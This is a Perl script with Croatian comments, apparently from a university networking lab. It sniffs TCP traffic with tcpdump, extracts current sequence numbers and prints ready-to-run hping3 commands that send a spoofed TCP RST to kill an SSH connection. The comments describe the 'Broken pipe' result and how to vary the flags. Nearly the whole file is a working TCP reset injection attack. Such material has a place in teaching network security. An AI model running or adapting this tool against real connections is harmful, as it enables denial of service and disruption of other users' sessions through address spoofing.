#! /usr/bin/perl

# Skripta samo ispisuje hping naredbu koju treba pozvati!
#
# U jednom prozoru se pozove ova skripta,
# u drugom se napravi ssh login.nxlab.fer.hr (to je $remote_host)
# i u trecem se pozove naredba koju skripta ispise 
#    --> rezultat: "Broken pipe" u ssh
# Ako se zeli spoofati adresa doda se opcija --spoof hostname

# U stvari je bitan samo SEQ, ACK moze biti bilo ssto!

#$remote_host="161.53.63.21";
$remote_host="10.0.1.10";
$local_host="10.0.0.20";
#$local_host="161.53.19.232";

$pid = open(promet, "tcpdump -S -lni eth0 host $remote_host |")  or die "Ne mogu pozvati tcpdump $!\n";
my $lastseq = 0;
while (<promet>) {
    my($line) = $_;
	#print "Ucitao:", $line;
    chomp($line);

# 15:02:21.729235 IP 161.53.63.21.22 > 161.53.19.105.52150: Flags [P.], seq 2017399957:2017400421, ack 3391713064, win 8326, options [nop,nop,TS val 3539882212 ecr 166305621], length 464

	if($line =~ m|.*\sIP\s$local_host\.(\d+)\s>\s(\d+)\.(\d+).(\d+).(\d+).(\d+):.*seq\s(\d+):(\d+),\sack\s(\d+),.*|) {
	    my($p1,$ip21,$ip22,$ip23,$ip24,$p2,$seq1,$seq2,$ack) = ($1,$2,$3,$4,$5,$6,$7,$8,$9);
        $lastseq = $seq2;
		# Ako se zeli postaviti i ACK dodati: -L $ack i zamijenit -R s -RA
		print "sudo hping3 -c 1 -V -I eth0 -s $p1 -p $p2 --setseq $seq2 -R --spoof $local_host $remote_host\n";

# 14:46:22.543171 IP 161.53.19.105.52150 > 161.53.63.21.22: Flags [.], ack 2017390565, win 8189, options [nop,nop,TS val 165348943 ecr 3538925948], length 0
	} elsif ($line =~ m|.*\sIP\s$local_host\.(\d+)\s>\s(\d+)\.(\d+).(\d+).(\d+).(\d+):.*\sack\s(\d+),.*|) {
	    my($p1,$ip21,$ip22,$ip23,$ip24,$p2,$ack) = ($1,$2,$3,$4,$5,$6,$7);
		# Ako se zeli postaviti i ACK dodati: -L $ack i zamijenit -R s -RA
		print "sudo hping3 -c 1 -V -I eth0 -s $p1 -p $p2 --setseq $lastseq -R --spoof $local_host $remote_host\n";
   }
}
close(promet) or die "Ne mogu zatvoriti tcpdump: $!\n";

